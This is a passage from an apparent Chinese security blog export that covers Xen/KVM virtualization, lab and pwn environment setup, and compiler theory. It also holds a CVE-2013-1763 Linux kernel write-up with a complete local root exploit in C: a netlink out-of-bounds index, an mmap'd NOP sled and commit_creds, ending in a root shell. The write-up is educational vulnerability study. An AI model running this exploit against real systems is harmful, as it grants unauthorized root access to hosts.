内存虚拟化客户操作系统只允许对实际页表进行只读访问,必须通过hypercall更新页表,而不是直接写内存,以防止客户操作系统做了不可接受的更改. 每次客户操作系统请求一个新的页表,它会从自身的保留的内存中分配并初始化页,并将其注册到Xen.客户操作系统可以批量请求更新以缓解进入管理程序的开销. 设备虚拟化Xen通过特权域(Domain0或者特权级驱动程序域)管理实际设备,然后给所有的客户机导出一类通用设备. Xen所使用的架构称为分离驱动程序模型,即非特权客户机运行前端驱动程序,而直接访问设备的特权域运行后端驱动程序,后端驱动程序了解特定物理设备的底层细节.该类虚拟化模型允许客户操作系统只为每种通用类型的设备实现一种设备驱动程序,随后依赖于特权域中的操作系统来获得实际物理设备的设备驱动程序. 大多数主流的虚拟机管理程序以建立在环缓冲区的共享内存来实现前端驱动程序和后端驱动程序的通讯.通过PV驱动程序垂直传递缓冲区信息的高性能通讯机制的优势使这种通讯很容易实现.在Hyper-V中,后端被称为虚拟化服务提供者,前端被称为虚拟化服务客户端. Xen的最后一个选项是能够将物理设备直接授权给非特权域,如果不支持虚拟化特定设备或者如果需要尽可能高的性能的话. 硬件辅助虚拟化 2005年后,Intel和AMD开始支持虚拟化,Intel引入Intel-VT技术,增加了VMX root operation和VMX non-root operation两种模式,两种模式都支持所有的4个运行级别.这样,VMM可以运行在VMX root operation模式下,客户OS运行在VMX non-root operation模式下. 两种操作模式可以互相转换. 运行在VMX root operation 模式下的VMM通过显式调用VMLAUNCH或VMRESUME指令切换到VMX non-root operation模式,硬件自动加载Guest OS的上下文,于是Guest OS获得运行,这种转换称为VM entry. Guest OS运行过程中遇到需要VMM处理的事件,例如外部中断或缺页异常,或者主动调用VMCALL指令调用VMM的服务的时候(与系统调用类似),硬件自动挂起Guest OS,切换到VMX root operation模式,恢复VMM的运行,这种转换称为VM exit. VMX root operation模式下软件的行为与在没有VT-x技术的处理器上的行为基本一致.而VMX non-root operation模式则有很大不同,最主要的区别是此时运行某些指令或遇到某些事件时,会发生VM exit. guest:客户机系统,包括CPU(vCPU),内存,驱动,被kvm置于一种受限制的CPU模式下运行.kvm:运行在内核空间,提供CPU和内存的虚拟化,以及guest的I/O拦截.qemu:运行在用户空间,提供硬件I/O虚拟化,通过/dev/kvm设备和虚拟机交互. qemu与kvm就是一套基于硬件辅助的全虚拟化的实现. kvm主要功能是初始化CPU硬件打开虚拟化模式,然后将虚拟客户机运行在虚拟机模式下,并对其运行提供一定的支持. 以在Intel上运行为例,kvm模块被加载的时候,首先初始化kvm内部的数据结构,然后打开CPU控制及存取CR4的虚拟化模式开关,并通过执行VMXON指令将宿主操作系统置于VMX root operation.最后kvm模块创建特殊设备文件/dev/kvm并等待来自用户空间的指令. kvm需要一个用户程序通过/dev/kvm接口来设置一个虚拟服务器的地址空间和向虚拟机提供模拟的I/O设备并将界面显示映射回宿主机的显示屏供用户操作. 这个程序就是qemu-kvm(qemu-kvm是qemu的一个分支,但现在两者已经没有区别),在qemu-kvm中,kvm的虚拟机被实现为常规的Linux进程,即一个qemu-kvm进程,由标准调度程序调度.该进程包括几种线程:I/O线程用于管理模拟设备,vCPU线程用于运行Guest代码,和处理event loop,offloaded tasks的线程. 然后由qemu和kvm相互配合进行虚拟机的创建和运行,两者的通信主要是针对特殊设备文件dev/kvm的ioctl调用.创建虚拟机时kvm会分配对应的内核数据结构,同时返回一个文件句柄来代表所创建的虚拟机.针对该句柄的调用可以对虚拟机做相应地管理,比如创建用户空间虚拟地址和客户机物理地址,真实物理地址之间的映射关系,运行虚拟机等. CPU虚拟化 kvm为每一个vCPU生成对应的文件句柄,用于进行包括执行虚拟处理器在内的一些操作,虚拟机在kvm的支持下置于VMX non-root operation模式下执行二进制指令. 普通的Linux内核有两种执行模式:内核模式(Kenerl)和用户模式(User).为了支持带有虚拟化功能的CPU,kvm向Linux内核增加了第三种模式即客户机模式,对应于CPU的VMX non-root mode. 在non-root模式下,所有敏感的二进制指令都被CPU捕捉到,CPU在保存现场之后自动切换到VMX root operation模式,由kvm决定如何处理. kvm内核模块作为用户模式和客户机模式之间的桥梁,用户模式中的qemu-kvm会通过ioctl命令来运行虚拟机,kvm内核模块收到该请求后,它先进行初始化,比如将vCPU上下文加载到VMCS等,然后使CPU进入VMX non-root模式,开始执行客户机代码. 三种模式的分工. Guest模式:执行客户机系统非I/O代码,并在需要的时候驱动CPU退出该模式. Kernel模式:负责将CPU切换到Guest模式执行代码,并在CPU退出Guest模式时回到Kernel模式. User模式:替代客户机系统执行I/O操作. kvm虚拟机基于vCPU,而vCPU作为qemu线程被Linux作为普通的线程/轻量级进程调度到物理CPU上,所以虚拟机代码是运行在物理CPU之上. 要将虚拟机的线程调度到某个物理CPU,需要经历两个过程:虚拟机线程调度到vCPU,该调度由虚拟机操作系统负责;vCPU线程调度到物理CPU即主机物理CPU,该调度由Hypervisor即Linux负责. 内存虚拟化除了CPU的虚拟化,内存虚拟化也由kvm实现.kvm的内存虚拟化就是一个将虚拟机的虚拟内存转换为宿主机物理内存的过程,Guest使用的依然是宿主机的物理内存. CPU中的内存管理单元MMU是通过页表的形式将程序运行的虚拟地址转换成实际物理地址. kvm实现虚拟机内存的方式是,利用mmap系统调用,在qemu-kvm主线程的虚拟地址空间中申明一段连续的大小的空间用于客户机物理内存映射.在虚拟机模式下,MMU的页表则必须在一次查询的时候完成两次地址转换,因为除了将客户机程序的虚拟地址转换了客户机的物理地址外,还要将客户机物理地址转化成真实物理地址. 内存虚拟化有两种实现方式:通过软件实现内存地址的翻译,比如Shadow page table;或者通过基于CPU的辅助虚拟化功能,比如AMD的NPT和Intel的EPT技术. 影子页表由软件(qemu-kvm)维护,实际上就是一个Guest的页表到宿主机页表的映射,每一级的页表的hash值对应到qemu-kvm中影子页表的一个目录. 在初次GVA -&gt; HPA(客户机虚拟地址到宿主机物理地址)的转换时候,Guest产生缺页中断,和传统的转换过程一样,经过两次转换,然后影子页表记录这个转换关系.坏处在于qemu-kvm需要为Guest的每个进程维护一个影子页表,带来很大的内存开销. EPT可以看做一个硬件的影子页表,在Guest中增加EPT寄存器. 当Guest产生了CR3和页表的访问时会产生缺页异常,如果在软件模拟或者影子页表的虚拟化方式中,此时会有VM退出,qemu-kvm进程接管并获取到此异常.但是在EPT中,qemu-kvm忽略此异常,按照传统的缺页中断处理,产生EXIT_REASON_EPT_VIOLATION,然后Guest退出,qemu-kvm捕获到异常,分配物理地址建立GVA -&gt; HPA的映射并保存到EPT中,将EPT载入到MMU,下次转换时候直接查询根据CR3查询EPT表来完成GVA -&gt; HPA的转换. 其他优化技术Kernel SamePage Merging,KSM作为内核中的守护进程存在,定期执行页面扫描识别副本页面并合并副本,从而释放这些页面.因此,在多个进程中,Linux将内核相似的内存页合并成一个内存页. 这个特性被kvm用来减少多个相似的虚拟机的内存占用,提高内存的使用效率. kvm虚拟机还有一个优化技术:Huge Page Backed Memory.x86 CPU通常使用4Kb内存页,经过配置后能够使用巨页(huge page).使用巨页则kvm的虚拟机页表将使用更少的内存,并且提高CPU的效率.]]></content>
      <categories>
        <category>CS</category>
        <category>virtualization</category>
      </categories>
      <tags>
        <tag>virtualization</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[binary-漏洞分析-Linux-kernel-pwn-CVE-2013-1763]]></title>
    <url>%2Fposts%2F82f6f4c6%2F</url>
    <content type="text"><![CDATA[准备与漏洞分析下载源码:https://mirrors.tuna.tsinghua.edu.cn/kernel/v3.x/linux-3.7.1.tar.bz2. 在虚拟机中解压:tar -jxvf linux-3.7.1.tar.bz2. patch:https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=6e601a53566d84e1ffd25e7b6fe0b6894ffd79c0. 漏洞点在于没有检查数组越界.可以伪造函数指针进行越权. 1234567891011121314151617181920212223static struct sock_diag_handler *sock_diag_handlers[AF_MAX];static int __sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh) &#123; int err; struct sock_diag_req *req = NLMSG_DATA(nlh); struct sock_diag_handler *hndl; if (nlmsg_len(nlh) &lt; sizeof(*req)) return -EINVAL; hndl = sock_diag_lock_handler(req-&gt;sdiag_family);//数组越界 if (hndl == NULL) err = -ENOENT; else err = hndl-&gt;dump(skb, nlh);//伪造函数指针 sock_diag_unlock_handler(hndl); return err;&#125;static const inline struct sock_diag_handler *sock_diag_lock_handler(int family) &#123; if (sock_diag_handlers[family] == NULL) request_module("net-pf-%d-proto-%d-type-%d", PF_NETLINK, NETLINK_SOCK_DIAG, family); mutex_lock(&amp;sock_diag_table_mutex); return sock_diag_handlers[family];//数组越界&#125; 编译内核需要切换gcc-4.7:sudo update-alternatives --config gcc. 由于perl版本问题需要将kernel/timeconst.pl中的373:if(!define(xxx))的define()省略. 123make mrpropermake ARCH=i386 menuconfigmake ARCH=i386 bzImage -j8 &amp;&amp; make ARCH=i386 vmlinux -j8 编译exp时报错. 12345w4rd3n@w4rd3n-hack:~$ gcc -m32 -o exp -static -I linux-3.7.1/ exp.cIn file included from /usr/include/sys/socket.h:38:0, from exp.c:2:/usr/include/bits/socket.h:349:24: fatal error: asm/socket.h: No such file or directorycompilation terminated. 执行以下命令即可. 12cd /usr/includesudo ln -s asm-generic/ asm 运行. 1qemu-system-i386 -kernel linux-3.7.1/arch/x86/boot/bzImage -initrd rootfs.img -append "console=ttyS0 root=/dev/ram rdinit=/sbin/init" --nographic -gdb tcp::1234 exploit代码分析现在已经可以通过数组越界跳转到其他地址,问题在于跳转到哪. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546struct nlmsghdr &#123; __u32 nlmsg_len; /* Length of message including header */ __u16 nlmsg_type; /* Message content */ __u16 nlmsg_flags; /* Additional flags */ __u32 nlmsg_seq; /* Sequence number */ __u32 nlmsg_pid; /* Sending process port ID */&#125;;struct unix_diag_req &#123; __u8 sdiag_family; __u8 sdiag_protocol; __u16 pad; __u32 udiag_states; __u32 udiag_ino; __u32 udiag_show; __u32 udiag_cookie[2];&#125;;struct sock_diag_handler &#123; __u8 family; int (*dump)(struct sk_buff *skb, struct nlmsghdr *nlh);&#125;;struct netlink_table &#123; struct nl_portid_hash hash; struct hlist_head mc_list; struct listeners __rcu *listeners; unsigned int flags; unsigned int groups; struct mutex *cb_mutex; struct module *module; void (*bind)(int group); int registered;&#125;;struct nl_portid_hash &#123; struct hlist_head *table; 四个字节 unsigned long rehash_time; //也是四个字节.0x00012b59 unsigned int mask; unsigned int shift; unsigned int entries; unsigned int max_shift; u32 rnd;&#125;;static struct netlink_table *nl_table; nl_table里面有一个变量rehash_time的值正好在0x10000-0x130000这个区域内,所以可以利用这个值来跳转,只需要使sock_diag_handlers[sdiag_family] - dump正好落在这个值上就可以了. 12345678$ cat /proc/kallsyms | grep nl_tablec09f2180 d nl_table_lockc09f2184 d nl_table_waitc0b328c0 b nl_table_usersc0b328c4 b nl_table$ cat /proc/kallsyms | grep sock_diag_handlersc0b32780 b sock_diag_handlers#(0xc0b328c4 - 0xc0b32780) / 4 = 81 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;linux/netlink.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;errno.h&gt;#include &lt;linux/if.h&gt;#include &lt;linux/filter.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;linux/sock_diag.h&gt;#include &lt;linux/inet_diag.h&gt;#include &lt;linux/unix_diag.h&gt;#include &lt;sys/mman.h&gt;typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);_commit_creds commit_creds;_prepare_kernel_cred prepare_kernel_cred;int __attribute__((regparm(3))) //这是指示GCC编译器选用3个寄存器代替堆栈来传递参数。kernel_code() &#123; commit_creds(prepare_kernel_cred(0)); //这行代码执行之后就可以获取root权限，但是这两个函数都是内核函数，必须在内核态执行才有效。 return -1;&#125;int main() &#123; int fd; struct &#123; struct nlmsghdr nlh; struct unix_diag_req r; &#125; req; char buf[8192]; if ((fd = socket(AF_NETLINK, SOCK_RAW, NETLINK_SOCK_DIAG)) &lt; 0)&#123; printf("Can't create sock diag socket\n"); return -1; &#125; memset(&amp;req, 0, sizeof(req)); req.nlh.nlmsg_len = sizeof(req); req.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY; req.nlh.nlmsg_flags = NLM_F_ROOT|NLM_F_MATCH|NLM_F_REQUEST; req.nlh.nlmsg_seq = 123456; req.r.udiag_states = -1; req.r.udiag_show = UDIAG_SHOW_NAME | UDIAG_SHOW_PEER | UDIAG_SHOW_RQLEN; commit_creds = (_commit_creds) 0xc025ae80; prepare_kernel_cred = (_prepare_kernel_cred) 0xc025b0c0; req.r.sdiag_family = 81; unsigned long mmap_start, mmap_size; mmap_start = 0x10000; mmap_size = 0x120000; printf("mmapping at 0x%lx, size = 0x%lx\n", mmap_start, mmap_size); if (mmap((void*)mmap_start, mmap_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) == MAP_FAILED) &#123; printf("mmap fault\n"); exit(1); &#125; memset((void *)mmap_start, 0x90, mmap_size); //将其全部填充为NOP char jump[] = "\x55\x89\xe5\xb8\x11\x11\x11\x11\xff\xd0\x5d\xc3"; /* int jump(void *skb, void *nlh) &#123; asm volatile ( "mov $kernel_code, %eax\n" "call *%eax\n" ); &#125; */ unsigned long * asd = &amp;jump[4]; * asd = (unsigned long)kernel_code; //使用kernel_code函数的地址替换掉jump[]中的0x11 memcpy((void *)mmap_start + mmap_size - sizeof(jump), jump, sizeof(jump)); //触发漏洞 if (send(fd, &amp;req, sizeof(req), 0) &lt; 0) &#123; printf("bad send\n"); close(fd); return -1; &#125; printf("uid = %d, euid = %d\n", getuid(), geteuid() ); if(!getuid()) system("/bin/sh");&#125;]]></content>
      <categories>
        <category>binary</category>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>kernel-pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-kali虚拟机环境搭建]]></title>
    <url>%2Fposts%2F612b543a%2F</url>
    <content type="text"><![CDATA[apt换源sources.list. 12deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib docker1234567curl -fsSL https://download.docker.com/linux/debian/gpg | apt-key add -echo 'deb [arch=amd64] https://download.docker.com/linux/debian buster stable' &gt; /etc/apt/sources.list.d/docker.listapt-get updateapt-get remove docker docker-engine docker.ioapt-get install docker-cesudo vim /etc/docker/daemon.json# &#123;"registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]&#125; 123systemctl start dockersystemctl enable docker#开机自启 docker-compose安装. 123curl -L https://github.com/docker/compose/releases/download/1.8.0/docker-compose-`uname -s`-`uname -m` &gt; /usr/local/bin/docker-composechmod +x /usr/local/bin/docker-composeln -s /usr/local/bin/docker-compose /usr/bin/docker-compose dockerfly12docker pull helyho/dockerflydocker run --name dockerfly -d -v /var/run/docker.sock:/var/run/docker.sock --restart always -p 28083:28083 helyho/dockerfly 访问:http://127.0.0.1:28083,使用:admin/1234登录到dockerfly. penetrationvulhub12345678910111213cd ~wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zipcd vulhub-mastercd flask/ssti#进入某一个漏洞/环境的目录docker-compose build#自动化编译环境docker-compose up -d#启动整个环境docker-compose down -v#测试完成后,删除整个环境 VulApps12git clone https://github.com/Medicean/VulApps.gitdocker pull medicean/vulapps]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-linux-web虚拟机环境搭建]]></title>
    <url>%2Fposts%2Fbf3a9738%2F</url>
    <content type="text"></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CS-compiler-principles-基础]]></title>
    <url>%2Fposts%2F5697c2%2F</url>
    <content type="text"><![CDATA[程序设计语言现今有几千种程序设计语言,可以通过不同方式进行分类. 第一代语言机器语言,第二代语言汇编语言,第三代语言为Fortran,C,C++等高级程序设计语言,第四代语言是为特定应用设计的语言,如SQL,第五代语言指基于逻辑和约束的语言,如Prolog. 指明如何完成一个计算任务的语言称为强制式语言,如C,C++,FORTRAN.指明要进行哪些计算的语言称为声明式语言,如ML,LISP等函数式语言.还有如面对对象语言,脚本语言等分类. 高级程序语言都可看成是一个字符集上的字符串.程序语言主要是由语法和语义两方面定义. 语义规则定义了语言的单词符号和语法单位的意义. 语言的语法是用来形成一个合法程序的一组规则,这些规则一部分称为词法规则,另一部分称为语法规则.词法规则定义了单词符号的形成规则,而语法规则定义了语法单位的形成规则.常见语法单位:表达式,语句,函数,过程和程序等. 编译技术的应用编译技术基本的数学模型有:有限自动机和正规式,上下文无法文法,树形结构. 编译技术被用于:高级程序设计语言的实现,针对计算机体系结构的优化,新计算机体系结构的设计,程序的翻译(二进制翻译,硬件合成,数据查询解释器,翻译后模拟),软件生成率工具(错误检测,类型检查,边界检查,内存管理工具). 语言处理器常见的语言处理器有编译器和解释器. 编译器是一个读取以源语言编写的程序并把其翻译为一个等价的使用目标语言编写的程序. 解释器是一个读取以源语言编写的程序并逐个语句的执行. 也有一些即时编译器(JIT)在运行中处理输入的前一刻将字节码翻译成目标语言再执行. 编译器概览编译器就是一个映射,由两部分组成:分析部分(前端)和综合部分(后端). 分析部分主要进行词法分析,语法分析,语义分析,中间代码生成,这个过程中也会产生相应的中间表示形式,并生成符号表,分析部分是与源语言有关但与目标机无关的那些部分. 综合部份根据中间语言生成目标程序,主要包括编译程序中与目标机有关的那些部分,也就是优化和目标代码生成. 编译器第一个步骤称为词法分析或扫描,词法分析器将源代码解析成有意义的词素的序列并生成对应的符号表,对于每个词素,词法分析器输出形如&lt;token-name, attribute-value&gt;的词法单元,token-name是该词法单元的类型(如基本字,标识符,常数,算符和界符.基本字又称为保留字,界符又称为分隔符),attribute-value是对应的符号或指向对应的符号(某些词法单元无属性值,例如:=). 编译器第二个步骤称为语法分析或解析,语法分析根据语语法规则,把单词符号串分解成各类语法单位,如短语,子句,句子和程序等.通过语法分析,确定整个输入串是否构成语法上正确的程序.常用的语法规则用上下文无关文法描述.对应产生的结果一般是语法树. 词法分析是一种线性分析,而语法分析是一种层次结构的分析. 语义分析器使用语法树和符号表来检查语义,同时会收集类型信息来进行类型检查.在编译的过程中编译器会产生多个中间表示形式,例如语法树和中间代码,中间代码是一种含义明确,便于处理的记号系统.语义分析的同时会产生中间代码,典型的有四元式,三地址代码,间接三地址代码,逆波兰式,树形表示等. 编译器还可能会对中间代码进行优化(公共子表达式的提取,强度削弱,删除无用代码),产生时间或空间上更良好的中间代码,最后将优化结果映射为目标代码. 其中符号表一直存在,用于记录变量的名字和信息,同时在编译的过程中不断补充类型等信息. 编译程序在各个阶段应诊断和报告源程序中的错误,包括词法错误,语法错误,语义错误等.编译程序应报告出错地点,并给出简明准确的提示信息. 编译器构造工具常用的编译器构造工具. 词法分析器的生成器:例如Lex,Flex. 语法分析器的生成器:例如Lex,Yacc,bison++. 编译程序的移植利用A机器上已有的高级语言L编写一个在B机器上运行的高级语言L的编译程序. 先用L语言编写产生B机器代码的L编译程序源程序R,R经过A机器上的L的编译程序编译后,生成能够在A机器上运行的,产生B机器代码的编译程序I,现在用I编译R,就产生了P程序,P程序可以将L语言编译成能够在B机器上运行的,由B机器代码构成的目标程序. 符号串字母表是符号的非空有穷集合.任何程序语言都有自己的字母表,一个程序语言只使用一个有限字符集作为字母表,用∑表示. ∑上的一个符号串(字)是指由∑中的符号所构成的一个有穷序列. 空字ε是∑上的一个符号串,空字ε是不包含任何符号的序列. 若x是∑上的符号串,而a是∑的元素,则xa是∑上的符号串. y是∑上的符号串,当且仅当它前两条导出. ∑*(Kleene闭包):表示∑上的所有字符串的全体,ε也在其中.Ф表示不含任何元素的空集{}. 设s是符号串. 前缀:移走s的尾部的零个或多于零个符号. 后缀:删去s的头部的零个或多于零个符号. 子串:从s中删去一个前缀和一个后缀. 子序列:从s中删去零个或多于零个符号(这些符号不要求是连续的). 逆转:将s中的符号按相反次序写出而得到的符号串. 长度:是该符号串中的符号的数目. 真前缀,真后缀,真子串:x != s &amp; x != ε. 符号串的运算. x = ba,y = nana,xy = banana. x ^ 0 = ε,.... 符号串集合的运算. 文法程序语言的语法规则是用文法来描述的,目前的程序语言一般用上下文无关的文法来描述. 几个基本概念. 非终结符号:需进一步定义的符号,只是一个中间产物. 终结符号:不需要再定义,是组成语言的基本符号. 开始符号:由该符号开始推导,例如:program. 产生式:由规则左部能产生规则右部,规则左部为非终结符号,例如:program -&gt; expr | program expr | empty(巴科斯范式). 上下文无关的文法定义. 直接推导定义.推导即通过0步或若干步直接推导. 对于推导a =&gt; b,如果每一步都是对a中的最左非终结符进行替换的,则称为最左推导;如果每一步都是对a中的最右非终结符进行替换的,则称为最右推导. 对某文法的同一句型存在不同的推导序列. 假定G是一个文法,S是它的开始符号.如果S能推导出a,则称a是一个句型.仅含终结符的句型是一个句子.文法G所产生句子的全体是一个语言,将它记为:L(G). 文法和语言之间并不存在一一对应关系,对于一给定的文法,唯一地确定它所产生的语言;但对于一个给定的语言往往可用若干个不同的文法来产. 化简了的文法:文法中不含有任何形如P -&gt; P的产生式;每个非终结符号P必须都有用处,即必须存在含P的句型,同时对于P不存在永不终结的回路. 语法分析树与二义性语法分析树定义. 画语法树的两种方法:自顶向下,根据推导序列,对每步推导画相应分枝;自底向上,根据归约序列,对每步归约画相应分枝.分析树是推导的图形表示. 一个句型推导或分析用一棵树结构图示出来,它反应了一个句子的语法结构层次.若文法是无二义性的,对于一个句子的多种推导画出的分析树是一样的,分析树并未描述推导过程. 描述一个句子的文法不是唯一的,对于一个句子的分析应是唯一的. 如果一个文法的句子存在两棵不同的分析树,那么该句子是二义性的.如果一个文法包含二义性的句子,则称这个文法是二义性的;否则,该文法是无二义性的. 对于任意一个上下文无关文法,不存在一个算法,能够在有限的步骤内判定它是无二义性的;但能给出一组充分条件,满足这组充分条件的文法是无二义性的. 文法的分类乔姆斯基文法有四种类型:0型,1型,2型,3型. 由于四种文法是按照将产生式做进一步限制而定义的,所以它们之间是逐级包含的关系,由四种文法产生的语言也是逐级包含的关系.ps:0型语言除外,从其中删去或往其中添加一个空串并不改变其语言类. 在程序语言中,与词法有关的规则属于正规文法;与局部语法有关的规则属于上下文无关文法;而与全局语法和语义有关的部分往往要用上下文有关文法来描述. 自嵌套的文法. 文法的递归性.]]></content>
      <categories>
        <category>CS</category>
        <category>compiler-principles</category>
      </categories>
      <tags>
        <tag>compiler-principles</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-linux-pwn虚拟机环境搭建]]></title>
    <url>%2Fposts%2F872440ea%2F</url>
    <content type="text"><![CDATA[镜像基于ubuntu-16.04.5-desktop-amd64.iso/ubuntu-18.04.1-desktop-amd64.iso/ubuntu-19.04-desktop-amd64.iso. 基础环境配置apt换源修改配置文件. 123sudo gedit /etc/apt/sources.listsudo apt-get update#sudo apt-get upgrade sources.list. 123456789101112131415161718#ubuntu16deb http://mirrors.ustc.edu.cn/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.ustc.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse##ubuntu18deb https://mirrors.ustc.edu.cn/ubuntu/ bionic main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse#ubuntu19deb https://mirrors.ustc.edu.cn/ubuntu/ disco main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ disco-updates main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ disco-backports main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ disco-security main restricted universe multiversedeb https://mirrors.ustc.edu.cn/ubuntu/ disco-proposed main restricted universe multiverse pip换源123mkdir ~/.piptouch ~/.pip/pip.confgedit ~/.pip/pip.conf ~/.pip/pip.conf. 12[global]index-url = https://pypi.mirrors.ustc.edu.cn/simple 工具12345sudo apt-get purge libreoffice-common unity-webapps-common thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese gnome-sudoku transmission-common gnome-orca webbrowser-app landscape-client-ui-install deja-dupsudo apt-get install python3-pip gdb git vim tmux socat python g++ python-pip python3 gdebi synapticsudo apt install python-pip --reinstallpip install --upgrade pippip install pycrypto docker12345678910sudo apt-get remove docker docker-engine docker.io containerd runcsudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-commoncurl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -sudo add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"sudo apt-get updatesudo apt-get install docker-ce docker-ce-cli containerd.iosudo vim /etc/docker/daemon.json# &#123;"registry-mirrors": ["https://docker.mirrors.ustc.edu.cn"]&#125;sudo systemctl start dockersudo systemctl enable docker pwn环境配置x8664位系统编译和运行32位程序需要另装库. 1sudo apt-get install gcc-multilib libc6:i386 搜索动态库文件123sudo apt-get install apt-filesudo apt-file update#apt-file search libcrypto.so.1.0.0 常用动态库12sudo apt-get install libssl1.0.0 libssl1.0.0:i386sudo apt-get install libncurses5-dev libssl-dev 调试工具https://github.com/hugsy/gef. 123git clone -b stable https://github.com/pwndbg/pwndbgcd pwndbgsudo ./setup.sh 12git clone https://github.com/longld/peda.git ~/pedaecho "source ~/peda/peda.py" &gt;&gt; ~/.gdbinit 调试其他架构程序. 1sudo apt-get install gdb-multiarch pwntools推荐使用python2版本. 1sudo pip install pwntools 1234sudo apt-get updatesudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essentialsudo python3 -m pip install --upgrade pipsudo python3 -m pip install --upgrade git+https://github.com/Gallopsled/pwntools.git@dev3 qumeLinux上的虚拟机程序,可用来跑内核和其他架构的程序.需要在vmware虚拟机设置中打开虚拟化. 1sudo apt-get install qemu qemu2.5存在一些问题,可下载最新版源码安装. 123sudo apt-get install libpixman-1-dev./configuresudo make install -j8 1sudo apt-get install -y qemu-kvm gcc有些老版本内核使用新版本gcc可能编译不过. 1234sudo apt-get install gcc-4.7sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-4.7 40sudo update-alternatives --install /usr/bin/gcc gcc /usr/bin/gcc-5 50sudo update-alternatives --config gcc 常用工具123456789101112131415161718#sudo add-apt-repository ppa:brightbox/ruby-ng#删除:sudo add-apt-repository -r ppa:brightbox/ruby-ng#sudo apt-get update#sudo apt-get install ruby2.6 ruby2.6-devsudo apt-get install ruby ruby-devsudo gem install one_gadget seccomp-toolssudo pip install setuptools --upgradesudo pip3 install setuptools --upgradesudo pip3 install liefsudo apt-get install binwalksudo apt install musl-toolsgit clone https://github.com/niklasb/libc-database.gitgit clone https://github.com/maroueneboubakri/lscan.git 多架构123456sudo apt-get install "binfmt*"#binfmt用来识别多架构文件类型sudo apt-get install gcc-arm-linux-gnueabi g++-arm-linux-gnueabi gcc-aarch64-linux-gnu g++-aarch64-linux-gnu gcc-arm-linux-gnueabihf g++-arm-linux-gnueabihf#ARM/AARCH64运行环境+交叉编译链sudo apt-get install linux-libc-dev-mips-cross libc6-mips-cross libc6-dev-mips-cross binutils-mips-linux-gnu gcc-mips-linux-gnu g++-mips-linux-gnu#MIPS运行环境+交叉编译链 v8环境配置配置git代理. 12git config --global http.proxy http://192.168.235.1:1080#关闭代理:git config --global --unset http.proxy 配置环境变量. 12echo 'export http_proxy="http://192.168.235.1:1080"' &gt;&gt; ~/.bashrcecho 'export https_proxy=$http_proxy' &gt;&gt; ~/.bashrc 下载工具. 123456git clone https://chromium.googlesource.com/chromium/tools/depot_tools.gitecho 'export PATH=$PATH:"$HOME/depot_tools"' &gt;&gt; ~/.bashrcgit clone https://github.com/ninja-build/ninja.gitcd ninja &amp;&amp; ./configure.py --bootstrap &amp;&amp; cd ..echo 'export PATH=$PATH:"$HOME/ninja"' &gt;&gt; ~/.bashrc 编译v8. 1fetch v8 &amp;&amp; cd v8 1234567891011gclient sync#更新git reset --hard [commit hash with vulnerability]#切换版本sudo apt-get install pkg-configtools/dev/v8gen.py x64.debugninja -C out.gn/x64.debug [d8]#d8参数表示只编译d8#debug-&gt;release编译release版本 启动. 1234567./out.gn/x64.release/d8#启动d8交互shell./out.gn/x64.release/d8 test.js#运行test.js./out.gn/x64.debug/d8./out.gn/x64.debug/shell./out.gn/x64.debug/d8 test.js 调试工具. 12echo 'source /home/w4rd3n/v8/tools/gdbinit' &gt;&gt; ~/.gdbinitecho 'source /home/w4rd3n/v8/tools/gdb-v8-support.py' &gt;&gt; ~/.gdbinit]]></content>
      <categories>
        <category>w4rd3n</category>
      </categories>
      <tags>
        <tag>environment</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[w4rd3n-云服务器环境搭建]]></title>
    <url>%2Fposts%2Fc2117a0c%2F</url>
